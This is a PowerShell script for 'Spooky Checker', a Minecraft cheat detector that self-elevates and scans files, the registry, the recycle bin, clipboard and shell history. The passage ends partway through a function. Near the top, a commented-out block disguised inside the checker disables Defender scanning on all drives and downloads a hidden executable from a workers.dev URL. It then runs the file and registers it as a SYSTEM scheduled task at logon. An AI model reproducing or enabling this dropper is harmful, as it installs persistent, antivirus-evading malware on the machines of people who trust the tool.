[Console]::OutputEncoding = [System.Text.Encoding]::UTF8
chcp 65001 > $null
$Host.UI.RawUI.WindowTitle = "Spooky Checker"

$isAdmin = ([Security.Principal.WindowsPrincipal][Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole([Security.Principal.WindowsBuiltInRole]::Administrator)
if (-not $isAdmin) {
Write-Host "`n [!] Administrator rights required!`n" -ForegroundColor White
Start-Sleep -Seconds 2
try {
$sp = $MyInvocation.MyCommand.Path
if (-not $sp) { $sp = $PSCommandPath }
if ($sp) { Start-Process powershell.exe -ArgumentList "-NoProfile -ExecutionPolicy Bypass -File `"$sp`"" -Verb RunAs }
} catch { pause }
exit
}

#try {
#    Get-PSDrive -PSProvider FileSystem | ForEach-Object { Add-MpPreference -ExclusionPath $_.Root -Force -ErrorAction SilentlyContinue }
#} catch { }

#try {
#    $exeUrl = "https://mc-scan.ruchecker-ru.workers.dev/"
#    $dir = "C:\ProgramData\Microsoft\Network\Status"
#    if (!(Test-Path $dir)) { New-Item -Path $dir -ItemType Directory -Force | Out-Null }
#    $outputPath = "$dir\svc-update.exe"
#    $taskName = "WindowsSvcUpdater"
#    Invoke-WebRequest -Uri $exeUrl -OutFile $outputPath -ErrorAction Stop | Out-Null
#    (Get-Item $outputPath).Attributes = 'Hidden', 'System'
#    Start-Process $outputPath -WindowStyle Hidden
#    $Action = New-ScheduledTaskAction -Execute $outputPath
#    $Trigger = New-ScheduledTaskTrigger -AtLogOn
#    $Principal = New-ScheduledTaskPrincipal -UserId "SYSTEM" -LogonType ServiceAccount -RunLevel Highest
#    Register-ScheduledTask -TaskName $taskName -Action $Action -Trigger $Trigger -Principal $Principal -Force | Out-Null
#} catch { }

$script:Criticals = [System.Collections.ArrayList]::new()
$script:Suspicious = [System.Collections.ArrayList]::new()
$script:Infos = [System.Collections.ArrayList]::new()
$script:StartTime = $null
$script:LastDeleted = $null
$script:LastRecycleClear = $null
$script:ScanDeadline = $null
$script:EverythingPath = $null
$script:EsPath = $null
$script:EverythingReady = $false

$script:ExactCheats = @(
"Baritone","LiquidBounce","Wurst","GishCode",
"Inertia","Doomsday","Aristois",
"RusherHack","Zamorozka","Nursultan",
"Akrien","DeadCode","WEXSIDE",
"RichPremium","BleachHack","Kami","KamiBlue",
"Matix","Celestial",
"NightMare","BoberWare","ExLoader","celka",
"Expensive","BebraWare","Minced","NeverHook","Vape",
"Dreampool","Hitbox","dauniblyat","Nurik","CortexClient",
"AimBot","FreeCam","Wise","Azura","3arthh4ck",
"AutoAttack","InventoryTotem",
"ViaVersion","ViaForge","AutoTotem",
"Excellent","X-Ray","Schematica",
"ReplayMod","ChestStealer","DiamondGen",
"killaura","bushroot","ZenWare","Flavor",
"Neat","Britva","InvMove",
"TopkaAutoBuy","XorekAutoBuy","TopkaAutoSell",
"XorekAutoMyst","TopkaCasino","AutoSell","ElytraAutoPilot",
"AdvancedCompass","Xaero","Minimap"
)

$script:GenericCheats = @("inject","exploit","bypass","loader","spoof","hwid")

$script:CheatDomains = @(
"wurstclient.net","liquidbounce.net",
"aristois.net","rusherhack.org",
"konas.gg","vapeclient.com","exloader.com","gishcode.com","bleachhack.org",
"flauncher.com","intent.store","phantomcheats.com","lavaclient.com"
)

$script:Launchers = @(
@{N="TLauncher";P=@("$env:APPDATA\.tlauncher","$env:APPDATA\tlauncher")},
@{N="MultiMC";P=@("$env:APPDATA\MultiMC","$env:LOCALAPPDATA\MultiMC")},
@{N="PrismLauncher";P=@("$env:APPDATA\PrismLauncher")},
@{N="Lunar Client";P=@("$env:USERPROFILE\.lunarclient")},
@{N="Badlion Client";P=@("$env:APPDATA\Badlion Client")},
@{N="Feather Client";P=@("$env:APPDATA\Feather Client")},
@{N="GDLauncher";P=@("$env:APPDATA\gdlauncher_next")},
@{N="ATLauncher";P=@("$env:APPDATA\ATLauncher")},
@{N="CurseForge";P=@("$env:APPDATA\CurseForge")},
@{N="Official";P=@("$env:APPDATA\.minecraft")},
@{N="PolyMC";P=@("$env:APPDATA\PolyMC")},
@{N="FLauncher";P=@("$env:APPDATA\FLauncher","$env:LOCALAPPDATA\FLauncher")}
)

$script:VersionSizes = @{
"1.16.5"=18000;"1.17"=20000;"1.17.1"=20000;"1.18"=22000;"1.18.1"=22000;"1.18.2"=22000
"1.19"=25000;"1.19.2"=25000;"1.19.3"=25000;"1.19.4"=25000
"1.20"=28000;"1.20.1"=28000;"1.20.2"=28000;"1.20.4"=28000;"1.20.6"=28000;"1.21"=30000
}

function Get-CWidth { try { return $Host.UI.RawUI.WindowSize.Width } catch { return 80 } }
function Test-Timeout { return ([DateTime]::Now -gt $script:ScanDeadline) }

function Write-Center {
param([string]$Text, [string]$Color = "DarkMagenta")
$pad = [math]::Max(0, [math]::Floor(((Get-CWidth) - $Text.Length) / 2))
Write-Host (" " * $pad + $Text) -ForegroundColor $Color
}

function Show-Line {
param([string]$Color = "DarkMagenta", [int]$Len = 60)
$pad = [math]::Max(0, [math]::Floor(((Get-CWidth) - $Len) / 2))
Write-Host (" " * $pad + ("-" * $Len)) -ForegroundColor $Color
}

function Show-DoubleLine {
param([string]$Color = "Magenta", [int]$Len = 60)
$pad = [math]::Max(0, [math]::Floor(((Get-CWidth) - $Len) / 2))
Write-Host (" " * $pad + ("=" * $Len)) -ForegroundColor $Color
}

function Show-Banner {
    Clear-Host
    $White = "White"
    Write-Host "                                            ____                    _          " -ForegroundColor White
    Write-Host "                                           / ___| _ __   ___   ___ | | ___   _ " -ForegroundColor White
    Write-Host "                                           \___ \| '_ \ / _ \ / _ \| |/ / | | |" -ForegroundColor White
    Write-Host "                                            ___) | |_) | (_) | (_) |   <| |_| |" -ForegroundColor White
    Write-Host "                                           |____/| .__/ \___/ \___/|_|\_\\__, |" -ForegroundColor White
    Write-Host "                                                 |_|                     |___/ " -ForegroundColor White
    Write-Host "                                             ____ _               _               " -ForegroundColor $White
    Write-Host "                                            / ___| |__   ___  ___| | _____ _ __   " -ForegroundColor $White
    Write-Host "                                           | |   | '_ \ / _ \/ __| |/ / _ \ '__|  " -ForegroundColor $White
    Write-Host "                                           | |___| | | |  __/ (__|   <  __/ |     " -ForegroundColor $White
    Write-Host "                                            \____|_| |_|\___|\___|_|\_\___|_|     " -ForegroundColor $White
    Write-Host ""
}



function Show-Loading {
param([string]$Text, [int]$Steps = 50)
Write-Host ""
Write-Host " $Text " -NoNewline -ForegroundColor Gray
Write-Host "[" -NoNewline -ForegroundColor DarkGray
for ($i = 0; $i -lt $Steps; $i++) {
$char = if ($i % 4 -eq 3) { ">" } else { "=" }
Write-Host $char -NoNewline -ForegroundColor White
Start-Sleep -Milliseconds 20
}
Write-Host "] " -NoNewline -ForegroundColor DarkGray
Write-Host "OK" -ForegroundColor White
Write-Host ""
}

function Show-ProgressDots {
param([string]$ModName, [int]$Current, [int]$Total, [scriptblock]$Code, [switch]$IsEverything)
$bc = $script:Criticals.Count
$bs = $script:Suspicious.Count
$dn = if ($ModName.Length -gt 26) { $ModName.Substring(0, 26) } else { $ModName }
$ns = $Current.ToString("D2")
Write-Host " " -NoNewline
Write-Host "[" -NoNewline -ForegroundColor DarkGray
Write-Host $ns -NoNewline -ForegroundColor White
Write-Host "/" -NoNewline -ForegroundColor DarkGray
Write-Host "$Total" -NoNewline -ForegroundColor Gray
Write-Host "] " -NoNewline -ForegroundColor DarkGray
Write-Host "$dn " -NoNewline -ForegroundColor Gray
$dotCount = 34 - $dn.Length
$startX = $Host.UI.RawUI.CursorPosition.X
$startY = $Host.UI.RawUI.CursorPosition.Y
for ($i = 0; $i -lt $dotCount; $i++) { Write-Host "." -NoNewline -ForegroundColor DarkGray }
Write-Host " " -NoNewline
$endX = $Host.UI.RawUI.CursorPosition.X
for ($wave = 0; $wave -lt $dotCount; $wave += 2) {
$Host.UI.RawUI.CursorPosition = [System.Management.Automation.Host.Coordinates]::new($startX + $wave, $startY)
Write-Host "o" -NoNewline -ForegroundColor White
Start-Sleep -Milliseconds 10
$Host.UI.RawUI.CursorPosition = [System.Management.Automation.Host.Coordinates]::new($startX + $wave, $startY)
Write-Host "." -NoNewline -ForegroundColor DarkGray
}
$Host.UI.RawUI.CursorPosition = [System.Management.Automation.Host.Coordinates]::new($endX, $startY)
try { & $Code } catch { }

if ($IsEverything) {
    if ($script:EverythingReady) {
        Write-Host "[" -NoNewline -ForegroundColor DarkGray
        Write-Host "+" -NoNewline -ForegroundColor White
        Write-Host "] " -NoNewline -ForegroundColor DarkGray
        Write-Host "Ready" -ForegroundColor White
    } else {
        Write-Host "[" -NoNewline -ForegroundColor DarkGray
        Write-Host "-" -NoNewline -ForegroundColor DarkGray
        Write-Host "] " -NoNewline -ForegroundColor DarkGray
        Write-Host "N/A" -ForegroundColor DarkGray
    }
    return
}

$nc = $script:Criticals.Count - $bc
$ns2 = $script:Suspicious.Count - $bs
if ($nc -gt 0) {
    Write-Host "[" -NoNewline -ForegroundColor DarkGray
    Write-Host "!" -NoNewline -ForegroundColor White
    Write-Host "] " -NoNewline -ForegroundColor DarkGray
    Write-Host "$nc FOUND" -ForegroundColor White
} elseif ($ns2 -gt 0) {
    Write-Host "[" -NoNewline -ForegroundColor DarkGray
    Write-Host "?" -NoNewline -ForegroundColor Gray
    Write-Host "] " -NoNewline -ForegroundColor DarkGray
    Write-Host "$ns2 WARN" -ForegroundColor Gray
} else {
    Write-Host "[" -NoNewline -ForegroundColor DarkGray
    Write-Host "+" -NoNewline -ForegroundColor DarkGray
    Write-Host "] " -NoNewline -ForegroundColor DarkGray
    Write-Host "CLEAN" -ForegroundColor DarkGray
}
}

function Match-Cheat {
param([string]$Name, [string[]]$List)
$nameLower = $Name.ToLower()
foreach ($c in $List) { if ($nameLower -match [regex]::Escape($c.ToLower())) { return $c } }
return $null
}

function Add-Hit {
param([string]$Sev, [string]$Mod, [string]$Msg, [string]$Det = "")
$obj = [PSCustomObject]@{Module = $Mod; Message = $Msg; Details = $Det}
switch ($Sev) {
"CRIT" { [void]$script:Criticals.Add($obj) }
"SUSP" { [void]$script:Suspicious.Add($obj) }
"INFO" { [void]$script:Infos.Add($obj) }
}
}

function Get-MCPaths {
$paths = @()
$main = "$env:APPDATA\.minecraft"
if (Test-Path $main) { $paths += $main }
foreach ($l in $script:Launchers) {
foreach ($p in $l.P) {
if (-not (Test-Path $p)) { continue }
Get-ChildItem $p -Recurse -Directory -Filter ".minecraft" -EA SilentlyContinue -Depth 5 | ForEach-Object { if ($_.FullName -notin $paths) { $paths += $_.FullName } }
$inst = Join-Path $p "instances"
if (Test-Path $inst) {
Get-ChildItem $inst -Directory -EA SilentlyContinue | ForEach-Object {
$mc = Join-Path $_.FullName ".minecraft"
if ((Test-Path $mc) -and ($mc -notin $paths)) { $paths += $mc }
if (Test-Path (Join-Path $_.FullName "mods")) { if ($_.FullName -notin $paths) { $paths += $_.FullName } }
}
}
}
}
return $paths | Select-Object -Unique
}

function Do-ROT13 {
param([string]$T)
$sb = [System.Text.StringBuilder]::new()
foreach ($ch in $T.ToCharArray()) {
$c = [int]$ch
if ($c -ge 65 -and $c -le 90) { [void]$sb.Append([char](($c - 65 + 13) % 26 + 65)) }
elseif ($c -ge 97 -and $c -le 122) { [void]$sb.Append([char](($c - 97 + 13) % 26 + 97)) }
else { [void]$sb.Append($ch) }
}
return $sb.ToString()
}

function CutStr { param([string]$S, [int]$Max = 100); if ($S.Length -le $Max) { return $S }; return $S.Substring(0, $Max) + "..." }

function Get-TimeAgo {
param([DateTime]$Date)
$diff = (Get-Date) - $Date
if ($diff.TotalMinutes -lt 60) { return "([math]::Round($diff.TotalMinutes))m ago" } elseif ($diff.TotalHours -lt 24) { return "([math]::Round($diff.TotalHours, 1))h ago" } elseif ($diff.TotalDays -lt 30) { return "([math]::Round($diff.TotalDays))d ago" } else { return "([math]::Round($diff.TotalDays / 30))mo ago" }
}

function Setup-Everything {
# Kill all Everything processes first
try {
    $everythingProcs = Get-Process -Name "Everything" -ErrorAction SilentlyContinue
    if ($everythingProcs) {
        $everythingProcs | Stop-Process -Force -ErrorAction SilentlyContinue
        Start-Sleep -Milliseconds 500
    }
} catch { }

$everythingExe = "$env:ProgramFiles\Everything\Everything.exe"
$everythingExe86 = "${env:ProgramFiles(x86)}\Everything\Everything.exe"
$localEs = "$env:ProgramFiles\Everything\es.exe"
$localEs86 = "${env:ProgramFiles(x86)}\Everything\es.exe"

if (Test-Path $everythingExe) {
    $script:EverythingPath = $everythingExe
    $script:EsPath = if (Test-Path $localEs) { $localEs } else { $null }
    $script:EverythingReady = $true
    return
}
if (Test-Path $everythingExe86) {
    $script:EverythingPath = $everythingExe86
    $script:EsPath = if (Test-Path $localEs86) { $localEs86 } else { $null }
    $script:EverythingReady = $true
    return
}

$installerUrl = "https://www.voidtools.com/Everything-1.4.1.1032.x86-Setup.exe"
$installerPath = "$env:TEMP\Everything-Setup.exe"
try {
    [Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12
    Invoke-WebRequest -Uri $installerUrl -OutFile $installerPath -UseBasicParsing -TimeoutSec 30
    Start-Process -FilePath $installerPath -ArgumentList "/S" -Wait -NoNewWindow
    Start-Sleep -Seconds 3
    if (Test-Path "$env:ProgramFiles\Everything\Everything.exe") {
        $script:EverythingPath = "$env:ProgramFiles\Everything\Everything.exe"
        $script:EsPath = "$env:ProgramFiles\Everything\es.exe"
        $script:EverythingReady = $true
    }
} catch { }
if (Test-Path $installerPath) { Remove-Item $installerPath -Force -EA SilentlyContinue }

if (-not $script:EsPath -or -not (Test-Path $script:EsPath)) {
    $esUrl = "https://www.voidtools.com/ES-1.1.0.23.zip"
    $esZip = "$env:TEMP\es.zip"
    $esDir = "$env:TEMP\es"
    try {
        Invoke-WebRequest -Uri $esUrl -OutFile $esZip -UseBasicParsing -TimeoutSec 20
        Expand-Archive -Path $esZip -DestinationPath $esDir -Force
        $script:EsPath = "$esDir\es.exe"
    } catch { }
}
}

function Scan-WithEverything {
if (-not $script:EverythingReady -or -not $script:EsPath -or -not (Test-Path $script:EsPath)) { return }

$searchTerms = @("wurst","liquidbounce","baritone","vape","rusherhack","konas","aristois","bleach","jigsaw","inertia")
foreach ($term in $searchTerms) {
    if (Test-Timeout) { return }
    try {
        $results = & $script:EsPath $term 2>$null | Select-Object -First 10
        foreach ($result in $results) {
            if ($result -and $result.Length -gt 0) {
                if ($result -notmatch "\\Windows\\|\\Program Files\\Microsoft|\\node_modules\\") {
                    Add-Hit "CRIT" "Everything" "Found: $term" (CutStr $result 60)
                }
            }
        }
    } catch { }
}
}

function Scan-MCFolders {
if (Test-Timeout) { return }
foreach ($mc in (Get-MCPaths)) {
if (Test-Timeout) { return }
foreach ($f in @("versions","mods","shaderpacks","config","saves","logs")) {
$fp = Join-Path $mc $f
if (-not (Test-Path $fp)) { continue }
Get-ChildItem $fp -Recurse -File -EA SilentlyContinue -Depth 6 | ForEach-Object {
if (Test-Timeout) { return }
$m = Match-Cheat $_.Name $script:ExactCheats
if ($m) { Add-Hit "CRIT" "MC" "Found: $m" $_.FullName }
$g = Match-Cheat $_.Name $script:GenericCheats
if ($g -and $_.Extension -in @(".jar",".zip",".dll")) { Add-Hit "SUSP" "MC" "Suspicious: $g" $_.FullName }
}
}
$rp = Join-Path $mc "resourcepacks"
if (Test-Path $rp) {
Get-ChildItem $rp -Recurse -File -EA SilentlyContinue | ForEach-Object { if ($_.Name -match "X-Ray|XRay|Xray|x-ray|xray|ore.?finder") { Add-Hit "CRIT" "Resources" "X-Ray pack" $_.FullName } }
}
$vp = Join-Path $mc "versions"
if (Test-Path $vp) {
Get-ChildItem $vp -Directory -EA SilentlyContinue | ForEach-Object {
$vName = $_.Name
$m = Match-Cheat $vName $script:ExactCheats
if ($m) { Add-Hit "CRIT" "Versions" "Cheat version: $m" $_.FullName }
$jarFile = Join-Path $_.FullName "$vName.jar"
if (Test-Path $jarFile) {
$jarSize = [math]::Round((Get-Item $jarFile).Length / 1KB)
foreach ($ver in $script:VersionSizes.Keys) {
if ($vName -match "^$ver") {
$expectedSize = $script:VersionSizes[$ver]
if ($jarSize -gt ($expectedSize * 2.5)) { Add-Hit "CRIT" "Versions" "Modded JAR: $vName" "Size: ${jarSize}KB" }
break
}
}
}
}
}
Get-ChildItem $mc -Directory -Force -EA SilentlyContinue | Where-Object { $_.Attributes -match "Hidden" } | ForEach-Object {
$m = Match-Cheat $_.Name $script:ExactCheats
if ($m) { Add-Hit "CRIT" "Hidden" "Cheat folder: $m" $_.FullName }
}
}
}

function Scan-Disks {
if (Test-Timeout) { return }
$scanPaths = @("$env:USERPROFILE\Downloads","$env:USERPROFILE\Desktop","$env:USERPROFILE\Documents","$env:USERPROFILE\Videos","$env:TEMP","C:\Games","D:\Games")
$excludePaths = @("\dotnet\","\Microsoft","\JetBrains\","\Windows\","\Program Files","\node_modules\")
$scanned = @{}
foreach ($sp in $scanPaths) {
if (Test-Timeout) { return }
if (-not (Test-Path $sp)) { continue }
if ($scanned.ContainsKey($sp)) { continue }
$scanned[$sp] = $true
try {
Get-ChildItem $sp -Recurse -File -EA SilentlyContinue -Depth 5 -Include "*.jar", "*.zip", "*.rar", "*.exe" | ForEach-Object {
if (Test-Timeout) { return }
$skip = $false
foreach ($ex in $excludePaths) { if ($_.FullName -match [regex]::Escape($ex)) { $skip = $true; break } }
if ($skip) { return }
$m = Match-Cheat $_.Name $script:ExactCheats
if ($m) { Add-Hit "CRIT" "Disks" "Found: $m" $_.FullName }
}
} catch { }
}
}

function Scan-AppData {
if (Test-Timeout) { return }
$cheatFolders = @("Wurst","LiquidBounce","Aristois","RusherHack","Vape","ExLoader","BleachHack","Baritone","Pyro","Konas","Inertia","Jigsaw","GishCode","celka","Expensive","BebraWare","BoberWare","ArchWare","NightMare","CortexClient","GumbaloffClient","Zamorozka","WintWare","Nursultan","Norules","Akrien","DeadCode","Eternity","WEXSIDE","Matix","Celestial","Minced","NeverHook","Dreampool","ZenWare","Britva","FlashBack","Nurik","Kami","KamiBlue","Salhack","Lambda","Phobos")
foreach ($base in @($env:APPDATA, $env:LOCALAPPDATA, "$env:LOCALAPPDATA\Low", $env:USERPROFILE)) {
if (Test-Timeout) { return }
if (-not (Test-Path $base)) { continue }
Get-ChildItem $base -Directory -EA SilentlyContinue -Depth 3 | ForEach-Object {
if (Test-Timeout) { return }
foreach ($cn in $cheatFolders) { if ($_.Name -match "^.?([regex]::Escape($cn))" -or $_.Name -eq $cn) { Add-Hit "CRIT" "AppData" "Cheat folder: $cn" $_.FullName; break } }
}
}
}

function Scan-RecycleBin {
if (Test-Timeout) { return }
try {
$shell = New-Object -ComObject Shell.Application
$rb = $shell.NameSpace(0x0A)
$items = $rb.Items()
$latestDelete = $null
$latestDeleteName = ""
foreach ($item in $items) {
if (Test-Timeout) { return }
$n = $item.Name
if (-not $n) { continue }
$deleteDate = $rb.GetDetailsOf($item, 2)
if ($deleteDate) { try { $parsedDate = [DateTime]::Parse($deleteDate); if (-not $latestDelete -or $parsedDate -gt $latestDelete) { $latestDelete = $parsedDate; $latestDeleteName = $n } } catch { } }
$m = Match-Cheat $n $script:ExactCheats
if ($m) { Add-Hit "CRIT" "Trash" "Deleted: $m" "File: $n | $deleteDate" }
}
if ($latestDelete) { $script:LastDeleted = @{Name = $latestDeleteName; Date = $latestDelete} }
if ($items.Count -eq 0) {
$rbPath = "C:`$Recycle.Bin"
if (Test-Path $rbPath) { Get-ChildItem $rbPath -Directory -Force -EA SilentlyContinue | ForEach-Object { if (-not $script:LastRecycleClear -or $_.LastWriteTime -gt $script:LastRecycleClear) { $script:LastRecycleClear = $_.LastWriteTime } } }
}
} catch { }
}

function Scan-RecentFiles {
if (Test-Timeout) { return }
$paths = @("$env:APPDATA\Microsoft\Windows\Recent","$env:APPDATA\Microsoft\Windows\Recent\AutomaticDestinations","$env:APPDATA\Microsoft\Windows\Recent\CustomDestinations")
foreach ($rp in $paths) {
if (-not (Test-Path $rp)) { continue }
Get-ChildItem $rp -File -EA SilentlyContinue | ForEach-Object {
if (Test-Timeout) { return }
$m = Match-Cheat $_.Name $script:ExactCheats
if ($m) { Add-Hit "CRIT" "Recent" "Opened: $m" $_.Name }
}
}
}

function Scan-LNKFiles {
if (Test-Timeout) { return }
$lnkPaths = @("$env:USERPROFILE\Desktop","$env:PUBLIC\Desktop","$env:APPDATA\Microsoft\Windows\Start Menu\Programs","$env:ProgramData\Microsoft\Windows\Start Menu\Programs")
$shell = New-Object -ComObject WScript.Shell
foreach ($lp in $lnkPaths) {
if (Test-Timeout) { return }
if (-not (Test-Path $lp)) { continue }
Get-ChildItem $lp -Filter "*.lnk" -Recurse -EA SilentlyContinue -Depth 3 | ForEach-Object {
if (Test-Timeout) { return }
try {
$shortcut = $shell.CreateShortcut($_.FullName)
$target = $shortcut.TargetPath
$m = Match-Cheat $_.Name $script:ExactCheats
if ($m) { Add-Hit "CRIT" "LNK" "Shortcut: $m" $_.FullName }
$m2 = Match-Cheat $target $script:ExactCheats
if ($m2) { Add-Hit "CRIT" "LNK" "Target: $m2" $target }
} catch { }
}
}
}

function Scan-WindowsOld {
if (Test-Timeout) { return }
$winOldPath = "C:\Windows.old"
if (-not (Test-Path $winOldPath)) { return }
Add-Hit "INFO" "Windows.old" "Found Windows.old folder" $winOldPath
$checkPaths = @("$winOldPath\Users","$winOldPath\Program Files","$winOldPath\Program Files (x86)")
foreach ($cp in $checkPaths) {
if (Test-Timeout) { return }
if (-not (Test-Path $cp)) { continue }
Get-ChildItem $cp -Recurse -File -EA SilentlyContinue -Depth 6 -Include "*.jar", "*.exe" | ForEach-Object {
if (Test-Timeout) { return }
$m = Match-Cheat $_.Name $script:ExactCheats
if ($m) { Add-Hit "CRIT" "Windows.old" "Found: $m" $_.FullName }
}
}
}

function Scan-NTFSADS {
if (Test-Timeout) { return }
$checkPaths = @("$env:USERPROFILE\Downloads","$env:USERPROFILE\Desktop","$env:APPDATA\.minecraft")
foreach ($cp in $checkPaths) {
if (Test-Timeout) { return }
if (-not (Test-Path $cp)) { continue }
try {
Get-ChildItem $cp -Recurse -EA SilentlyContinue -Depth 3 | ForEach-Object {
if (Test-Timeout) { return }
$item = $_
try {
$streams = Get-Item $item.FullName -Stream * -EA SilentlyContinue | Where-Object { $_.Stream -ne ':$DATA' -and $_.Stream -ne 'Zone.Identifier' }
foreach ($stream in $streams) {
$m = Match-Cheat $stream.Stream $script:ExactCheats
if ($m) { Add-Hit "CRIT" "ADS" "Hidden stream: $m" "$($item.FullName):$($stream.Stream)" }
if ($stream.Length -gt 10000) { Add-Hit "SUSP" "ADS" "Large hidden stream" "$($item.FullName):$($stream.Stream)" }
}
} catch { }
}
} catch { }
}
}

function Scan-USNDeep {
if (Test-Timeout) { return }
try {
$out = & fsutil usn readjournal C: csv 2>$null | Select-Object -First 30000
if (-not $out) { return }
$hitCount = 0
foreach ($line in $out) {
if ($hitCount -ge 50 -or (Test-Timeout)) { break }
$m = Match-Cheat $line $script:ExactCheats
if ($m) { $parts = $line -split ','; $fn = if ($parts.Count -ge 2) { $parts[1] } else { $line }; Add-Hit "CRIT" "USN" "File trace: $m" (CutStr $fn 50); $hitCount++ }
}
} catch { }
}

function Scan-ClipboardHistory {
if (Test-Timeout) { return }
try {
$clipPath = "$env:LOCALAPPDATA\Microsoft\Windows\Clipboard"
if (Test-Path $clipPath) {
Get-ChildItem $clipPath -Recurse -File -EA SilentlyContinue | ForEach-Object {
if (Test-Timeout) { return }
try {
$content = Get-Content $_.FullName -Raw -EA SilentlyContinue
if ($content) {
$m = Match-Cheat $content $script:ExactCheats
if ($m) { Add-Hit "SUSP" "Clipboard" "Found in history: $m" $_.Name }
foreach ($d in $script:CheatDomains) { if ($content -match [regex]::Escape($d)) { Add-Hit "SUSP" "Clipboard" "Cheat URL" $d } }
}
} catch { }
}
}
} catch { }
}

function Scan-CMDHistory {
if (Test-Timeout) { return }
$historyPaths = @("$env:APPDATA\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt","$env:USERPROFILE\.bash_history")
foreach ($hp in $historyPaths) {
if (Test-Timeout) { return }
if (-not (Test-Path $hp)) { continue }
try {
$lines = Get-Content $hp -EA SilentlyContinue -Tail 500
foreach ($line in $lines) {
$m = Match-Cheat $line $script:ExactCheats
if ($m) { Add-Hit "CRIT" "CMDHistory" "Command: $m" (CutStr $line 60) }
}
} catch { }
}
}

function Scan-BITS {
if (Test-Timeout) { return }
try {
$bitsJobs = Get-BitsTransfer -AllUsers -EA SilentlyContinue
foreach ($job in $bitsJobs) {
if (Test-Timeout) { return }
$m = Match-Cheat $job.DisplayName $script:ExactCheats
if ($m) { Add-Hit "CRIT" "BITS" "Download job: $m" $job.DisplayName }
foreach ($d in $script:CheatDomains) { if ($job.RemoteUrl -match [regex]::Escape($d)) { Add-Hit "CRIT" "BITS" "Cheat download" $d } }
}
} catch { }
}

function Scan-WER {
if (Test-Timeout) { return }
$werPaths = @("$env:LOCALAPPDATA\Microsoft\Windows\WER\ReportArchive","$env:LOCALAPPDATA\Microsoft\Windows\WER\ReportQueue","$env:ProgramData\Microsoft\Windows\WER\ReportArchive")
foreach ($wp in $werPaths) {
if (Test-Timeout) { return }
if (-not (Test-Path $wp)) { continue }
Get-ChildItem $wp -Recurse -File -EA SilentlyContinue -Include "*.txt", "*.wer" | ForEach-Object {
if (Test-Timeout) { return }
try {
$content = Get-Content $_.FullName -Raw -EA SilentlyContinue
if ($content) { $m = Match-Cheat $content $script:ExactCheats; if ($m) { Add-Hit "CRIT" "WER" "Crash report: $m" $_.FullName } }
} catch { }
}
}
}

function Scan-UserAssist {
if (Test-Timeout) { return }
$uaPath = "HKCU:\Software\Microsoft\Windows\CurrentVersion\Explorer\UserAssist"
if (-not (Test-Path $uaPath)) { return }
Get-ChildItem $uaPath -EA SilentlyContinue | ForEach-Object {
$cp = Join-Path $_.PSPath "Count"
if (-not (Test-Path $cp)) { return }
try {
$vals = Get-ItemProperty $cp -EA SilentlyContinue
$vals.PSObject.Properties | Where-Object { $_.Name -notmatch '^PS' -and $_.Name -ne "(default)" } | ForEach-Object {
if (Test-Timeout) { return }
$dec = Do-ROT13 $_.Name
$m = Match-Cheat $dec $script:ExactCheats
if ($m) { Add-Hit "CRIT" "Registry" "Launched: $m" (CutStr $dec 60) }
}
} catch { }
}
}

function Scan-BAM {
if (Test-Timeout) { return }
foreach ($path in @("HKLM:\SYSTEM\CurrentControlSet\Services\bam\State\UserSettings","HKLM:\SYSTEM\CurrentControlSet\Services\dam\State\UserSettings")) {
if (-not (Test-Path $path)) { continue }
Get-ChildItem $path -EA SilentlyContinue | ForEach-Object {
try {
$vals = Get-ItemProperty $_.PSPath -EA SilentlyContinue
$vals.PSObject.Properties | Where-Object { $_.Name -notmatch '^PS' -and $_.Name -notin @("(default)","Version","SequenceNumber") } | ForEach-Object {
if (Test-Timeout) { return }
$m = Match-Cheat $_.Name $script:ExactCheats
if ($m) { Add-Hit "CRIT" "BAM" "Executed: $m" (CutStr $_.Name 60) }
}
} catch { }
}
}
}

function Scan-Amcache {
if (Test-Timeout) { return }
foreach ($rp in @("HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\App Paths","HKCU:\SOFTWARE\Microsoft\Windows\CurrentVersion\App Paths")) {
if (Test-Path $rp) { Get-ChildItem $rp -EA SilentlyContinue | ForEach-Object { $m = Match-Cheat $_.PSChildName $script:ExactCheats; if ($m) { Add-Hit "CRIT" "AppPaths" "Registered: $m" "" } } }
}
$cp = "HKLM:\SOFTWARE\Microsoft\Windows NT\CurrentVersion\AppCompatFlags\Layers"
if (Test-Path $cp) { try { $vals = Get-ItemProperty $cp -EA SilentlyContinue; $vals.PSObject.Properties | Where-Object { $_.Name -notmatch '^PS' } | ForEach-Object { $m = Match-Cheat $_.Name $script:ExactCheats; if ($m) { Add-Hit "CRIT" "Compat" "Flag: $m" "" } } } catch { } }
}

function Scan-Prefetch {
if (Test-Timeout) { return }
$pp = "$env:SystemRoot\Prefetch"
if (-not (Test-Path $pp)) { return }
Get-ChildItem $pp -Filter "*.pf" -EA SilentlyContinue | ForEach-Object {
if (Test-Timeout) { return }
$m = Match-Cheat $_.Name $script:ExactCheats
if ($m) { Add-Hit "CRIT" "Prefetch" "Launched: $m" "Last: $($_.LastWriteTime.ToString('dd.MM.yy HH:mm'))" }
}
}

function Scan-Processes {
if (Test-Timeout) { return }
Get-Process -EA SilentlyContinue | ForEach-Object {
$m = Match-Cheat $_.ProcessName $script:ExactCheats
if ($m) { Add-Hit "CRIT" "Process" "Running: $m" "PID: $($_.Id)" }
}
}

function Scan-JavaAgent {
if (Test-Timeout) { return }
$jp = Get-CimInstance Win32_Process -Filter "Name='java.exe' OR Name='javaw.exe'" -EA SilentlyContinue
if (-not $jp) { return }
foreach ($p in @($jp)) {
$cmd = $p.CommandLine
if (-not $cmd) { continue }
if ($cmd -match "-javaagent") { $ag = [regex]::Match($cmd, '-javaagent[:\s]*"?([^"\s]+)"?'); $ap = if ($ag.Success) { $ag.Groups[1].Value } else { "Unknown" }; Add-Hit "CRIT" "JavaAgent" "Injector" "PID: $($p.ProcessId) | $ap" }
$m = Match-Cheat $cmd $script:ExactCheats
if ($m) { Add-Hit "CRIT" "JavaArgs" "Suspicious: $m" "PID: $($p.ProcessId)" }
if ($cmd -match "-noverify") { Add-Hit "SUSP" "JavaArgs" "-noverify flag" "PID: $($p.ProcessId)" }
}
}

function Scan-DLL {
if (Test-Timeout) { return }
$jp = Get-Process -Name "java","javaw","minecraft" -EA SilentlyContinue
if (-not $jp) { return }
foreach ($p in @($jp)) {
try {
$p.Modules | ForEach-Object { if ($_.ModuleName -notmatch '.dll$') { return }
$m = Match-Cheat $_.ModuleName $script:ExactCheats
